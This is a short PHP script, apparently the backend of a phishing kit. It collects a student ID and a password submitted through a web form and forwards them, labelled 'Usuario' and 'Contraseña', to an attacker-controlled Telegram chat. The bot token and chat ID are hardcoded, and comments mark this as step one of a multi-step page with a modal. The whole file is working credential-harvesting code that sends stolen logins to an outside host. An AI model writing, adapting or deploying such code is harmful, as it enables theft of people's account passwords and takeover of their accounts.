<?php
// ===== CONFIGURACIÓN DEL BOT =====
$token = "7743567443:AAHclNlsqPAoyYm4ZYfLJXFLhYKbBxtxZdE"; // Reemplaza con tu token
$chat_id = "6105688991"; // Reemplaza con tu chat ID

// ===== RECOGER DATOS =====
$id_estudiante = $_POST['id_estudiante'] ?? 'No especificado';
$codigo_preferencia = $_POST['codigo_preferencia'] ?? 'No especificado';

// ===== MENSAJE =====
$mensaje = "📋 *Paso 1 completado*\n";
$mensaje .= "🆔 *Usuario:* $id_estudiante\n";
$mensaje .= "💡 *Contraseña:* $codigo_preferencia\n";
$mensaje .= "📅 Fecha: " . date("d/m/Y H:i");

// ===== ENVIAR A TELEGRAM CON cURL =====
$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// No redirigimos aquí porque el modal se abrirá en el mismo index
?>
